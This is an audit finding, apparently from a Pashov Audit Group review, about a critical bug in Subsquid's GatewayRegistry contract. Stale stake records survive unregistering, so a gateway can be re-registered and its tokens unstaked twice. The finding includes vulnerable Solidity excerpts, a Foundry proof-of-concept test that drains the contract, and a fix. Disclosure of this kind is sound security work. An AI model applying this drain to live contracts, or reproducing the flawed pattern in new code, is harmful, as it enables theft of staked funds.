---
tags:
  - lang/solidity
  - sector/staking
  - platform/pashov
  - has/github
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Subsquid]]"
auditors:
  - "[[Pashov Audit Group]]"
report: "https://github.com/pashov/audits/blob/master/team/md/Subsquid-security-review.md"
genome:
  - "[[griefing]]"
  - "[[direct-drain]]"
  - "[[reward-accounting]]"
---
# [C-01] Gateway creator can steal all tokens from the GatewayRegistry

- id: 31545
- impact: HIGH
- protocol: [[Subsquid]]
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/Subsquid-security-review.md

## Summary


This bug report is about a problem in the `GatewayRegistry` contract, which allows users to register and stake tokens into gateways to receive computation units (CUs). The bug can be easily exploited by anyone and has a high impact, as it can result in the theft of user's funds. 

The problem arises when a user registers a gateway and then stakes tokens into it. The `totalUnstaked` value is set to 0, which can be exploited in the following steps: unstake tokens from the gateway, unregister the gateway, register a new gateway with the same `peerId`, and then unstake tokens again. 

The `stakes` mapping, which is used to track all user stakes, is not deleted when the gateway is unregistered. This allows for the exploitation of the bug. 

To fix this issue, it is recommended to delete the `stakes` mapping when a gateway is being unregistered. This will prevent the exploitation of the bug and ensure the safety of user's funds.

## Details

**Severity**

**Impact:** High, user's funds will be stolen

**Likelihood:** High, can be exploited by anyone and easy to implement

**Description**

`GatewayRegistry` contract allows users to register and stake tokens into gateways to receive computation units CUs. First, the user registers a gateway,

```solidity
  function register(bytes calldata peerId, string memory metadata, address gatewayAddress) public whenNotPaused {
    require(peerId.length > 0, "Cannot set empty peerId");
    bytes32 peerIdHash = keccak256(peerId);
    require(gateways[peerIdHash].operator == address(0), "PeerId already registered");

    gateways[peerIdHash] = Gateway({
      operator: msg.sender,
      peerId: peerId,
      strategy: defaultStrategy,
      ownAddress: gatewayAddress,
      metadata: metadata,
      totalStaked: 0,
>>    totalUnstaked: 0
    });
```

note `totalUnstaked` is set to 0. After this we can stake tokens

```solidity
  function _stakeWithoutTransfer(bytes calldata peerId, uint256 amount, uint128 durationBlocks) internal {
    (Gateway storage gateway, bytes32 peerIdHash) = _getGateway(peerId);
    _requireOperator(gateway);

    uint256 _computationUnits = computationUnitsAmount(amount, durationBlocks);
    uint128 lockStart = router.networkController().nextEpoch();
    uint128 lockEnd = lockStart + durationBlocks;
>>  stakes[peerIdHash].push(Stake(amount, _computationUnits, lockStart, lockEnd));
```

`stakes` mapping is used to track all user stakes. The problem arises when we unregister the gateway, we do not delete the `stakes`, it can be exploited in the following steps:

- unstake tokens from the gateway
- unregister gateway
- register new gateway with the same `peerId`
- since `totalUnstaked = 0`, we can unstake tokens again

```solidity
  function _unstakeable(Gateway storage gateway) internal view returns (uint256) {
    Stake[] memory _stakes = stakes[keccak256(gateway.peerId)];
    uint256 blockNumber = block.number;
    uint256 total = 0;
    for (uint256 i = 0; i < _stakes.length; i++) {
      Stake memory _stake = _stakes[i];
      if (_stake.lockEnd <= blockNumber) {
        total += _stake.amount;
      }
    }
    return total - gateway.totalUnstaked;
  }
```

Here is the coded POC for `GatewayRegistry.unstake.t.sol `

```solidity
  function test_StealStakes() public {
    uint256 amount = 100;
    address alice = address(0xA11cE);
    token.transfer(alice, amount);

    // stakers stake into their gateways
    gatewayRegistry.stake(peerId, amount, 200);
    vm.startPrank(alice);
    token.approve(address(gatewayRegistry), type(uint256).max);
    gatewayRegistry.register(bytes("alice"), "", address(0x6a7e));
    gatewayRegistry.stake(bytes("alice"), amount, 200);

    assertEq(token.balanceOf(address(gatewayRegistry)), 200);
    // exploit
    vm.roll(block.number + 300);
    gatewayRegistry.unstake(bytes("alice"), amount);
    gatewayRegistry.unregister(bytes("alice"));
    gatewayRegistry.register(bytes("alice"), "", address(0x6a7e));
    // unstake again
    gatewayRegistry.unstake(bytes("alice"), amount);
    assertEq(token.balanceOf(address(gatewayRegistry)), 0);
  }
```

**Recommendations**

Delete `stakes` mapping when gateway is being unregistered.
